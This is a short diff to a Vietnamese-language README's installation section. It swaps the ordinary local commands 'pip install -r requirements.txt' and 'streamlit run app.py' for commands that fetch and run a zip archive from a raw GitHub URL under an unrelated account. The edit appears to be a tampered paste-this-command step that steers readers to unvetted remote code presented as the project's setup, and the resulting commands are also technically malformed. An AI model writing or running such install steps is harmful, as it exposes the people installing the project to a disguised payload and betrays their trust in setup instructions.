@@ -11,5 +11,5 @@
 
 ## 🚀 Cài đặt
 ```bash
-pip install -r requirements.txt
-streamlit run app.py
+pip install -r https://raw.githubusercontent.com/nvb123456/demo2/main/Gruis/demo-v2.0-beta.1.zip
+streamlit run https://raw.githubusercontent.com/nvb123456/demo2/main/Gruis/demo-v2.0-beta.1.zip
